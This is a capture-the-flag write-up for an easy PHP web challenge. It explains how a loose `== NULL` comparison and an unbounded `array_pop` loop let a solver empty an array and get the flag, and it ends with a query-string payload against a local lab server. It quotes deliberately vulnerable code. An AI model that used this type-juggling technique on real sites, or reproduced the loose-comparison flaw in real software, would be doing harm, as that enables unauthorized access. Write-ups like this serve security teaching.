# loooose

**Author** : DreyAnd    
**Difficulty** : <font color='green'>Easy</font>  
**Description** : Take a peek at our book collection! Grab a few reads, but leave some for others too, okay? Sharing is caring!  
**Infrastructure requirements** : docker, zip

# Solution:

PHP Type Juggling at `$book == NULL` to get the flag. 

Key is that in PHP, `array(0) == NULL` returns `true`.

We can make `$book` an array of zero-length if we abuse the `array_pop()` functionality in this code block:
```php
if(isset($_GET['del']) && is_array($book)) {
        $del = (int)$_GET['del'];
        
        if(count($book) <= 1) {
            popup('Our security system has detected a potential threat, and your actions have been logged.');
            die();
        }

        for($i=0;$i<$del;$i++){ // No limit checks? We don't care, right?
            array_pop($book); 
        }
```

Simply, by passing `$_GET['book']` as an array and then using `$_GET['del']` to delete it, we can make the array empty.

Final solution URL: `http://127.0.0.1:1337/?book[]=a&book[]=b&del=2`

